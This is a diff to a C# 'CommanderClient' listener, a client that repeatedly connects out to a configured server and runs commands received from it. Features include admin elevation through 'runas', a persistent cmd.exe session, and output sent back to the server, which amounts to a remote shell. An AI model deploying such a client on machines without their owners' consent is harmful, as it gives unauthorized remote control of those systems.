@@ -11,27 +11,26 @@ namespace CommanderClient
 {
 	class Listener
 	{
-		public static string ipAddr { get; set; }
+		public static string Host { get; set; }
 		public static string port { get; set; }
 		public static string CustomName { get; set; }
 		
 
-		private static Socket ServerSocket;
+		public static Socket ServerSocket;
 		public static void Run() {
 			Thread th = new Thread(new ThreadStart(ClientThread));
 			th.Start();
 		}
 		static void ClientThread() {
 			//this thread will retry to connect when disconnected
-			IPAddress ip = IPAddress.Parse(Listener.ipAddr);
-			ServerSocket = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+			ServerSocket = new Socket(SocketType.Stream, ProtocolType.Tcp);
 			Thread th = new Thread(new ThreadStart(ListenToServer));
 			while (true) {
 				Thread.Sleep(6000);     //wait for a minute for next retry
 				if (!ServerSocket.Connected) {
 					try {
 						Console.WriteLine("Connecting...");
-						ServerSocket.Connect(ip, int.Parse(Listener.port));
+						ServerSocket.Connect(Host, int.Parse(Listener.port));
 						Console.WriteLine("Connected. Starting listenning thread.");
 						th.Start();
 					} catch (Exception ex) { Program.logger.Log(logType.Error, ex.Message); }
@@ -48,7 +47,8 @@ namespace CommanderClient
 				}
 			}
 		}
-		public static Process CmdProcess=null;
+		public static Process CommandProcess=null;		//Normal run and exit commands
+		
 		static void readInput(string Text) {        //this method reads received text
 			Console.WriteLine("readInput(\"{0}\")", Text);
 			string flags = Regex.Match(Text, @"^\<.+\>\b", RegexOptions.Multiline).Value;   //get flags by regex (example)-> https://regexr.com/4obl9 recommend to use external browser.
@@ -63,42 +63,45 @@ namespace CommanderClient
 				//this line must run by internalcmd.Do
 				Console.WriteLine("Internal Command:\"{0}\"", Text);
 				Program.internalCmd.Do(Text);
-			/*} else if (flags.Contains("@")) {
-				Console.WriteLine("Running command in cmd");
-				if (CmdProcess == null) {
-					Console.WriteLine("Running cmd");
-					CmdProcess = Process.Start(new ProcessStartInfo("cmd.exe") {
-						UseShellExecute = false,
-						RedirectStandardOutput = true,
-						RedirectStandardError = true,
-						RedirectStandardInput = true,
-					});
-				}
-				Console.WriteLine("Writting command in cmd input");
-				CmdProcess.StandardInput.WriteLine(Text);
-				Console.WriteLine("Writed");
-				if (!flags.Contains("q")) {
-					Console.WriteLine("Reading output");
-					string Output = "";
-					char[] buffer = new char[1024];
-					CmdProcess.StandardOutput.Read(buffer, 0, 1024);
-					Send(new string(buffer));
-				}*/
+			} else if (flags == "@") {
+				if (internalcmds.DirectCmd.CmdProcess == null || internalcmds.DirectCmd.CmdProcess.HasExited) {
+					Send("No running cmd");
+				} else
+					internalcmds.DirectCmd.CmdProcess.StandardInput.WriteLine(Text);
 			} else {
-				//common command
-				ProcessStartInfo startInf = new ProcessStartInfo();
-				//'c' flag for setting cmd as file name
-				startInf.FileName = flags.Contains("c") ? "cmd.exe" : Text.Split(' ')[0];
+				if (internalcmds.DirectCmd.CmdProcess != null && !internalcmds.DirectCmd.CmdProcess.HasExited) {
+					internalcmds.DirectCmd.CmdProcess.StandardInput.WriteLine(Text);
+				} else {
 
-				//'s' flag for using shell execute
-				startInf.UseShellExecute = flags.Contains("s");
+					//common command
+					ProcessStartInfo startInf = new ProcessStartInfo();
+					startInf.FileName = Text.Split(' ')[0];
+					startInf.Arguments = Text.Substring(startInf.FileName.Length);
 
-				//'o' flag for redirecting standard output
-				startInf.RedirectStandardOutput = flags.Contains("o");
+					//'s' flag for using shell execute
+					startInf.UseShellExecute = flags.Contains("s");
 
-				//'i' flag for redirecting standard input
-				startInf.RedirectStandardOutput = flags.Contains("i");
-				Process.Start(startInf);
+					//'o' flag for redirecting standard output
+					startInf.RedirectStandardOutput = flags.Contains("o");
+
+					//'a' flag for run as admin
+					if (flags.Contains("a"))
+						startInf.Verb = "runas";
+
+					//'w' wait for exit
+					try {
+						CommandProcess = Process.Start(startInf);
+						if (flags.Contains("w"))
+							CommandProcess.WaitForExit();
+						else
+							CommandProcess.WaitForExit(100);
+						if (flags.Contains("o")) {
+							CommandProcess.WaitForExit();
+							Send(CommandProcess.StandardOutput.ReadToEnd());
+						} else if (CommandProcess.HasExited)
+							Send($"Program exited at {CommandProcess.ExitTime} with code({CommandProcess.ExitCode})");
+					} catch (Exception ex) { Send($"Error: {ex.Message}"); }
+				}
 			}
 		}
 		public static int WaitSec { get; set; }
@@ -130,7 +133,7 @@ namespace CommanderClient
 			return !Empty;
 		}
 		public static void Send(string Text) {
-			Text += "<$eof>";
+			Text +="<$eof>";
 			byte[] buffer = Encoding.ASCII.GetBytes(Text);
 			try {
 				ServerSocket.Send(buffer);
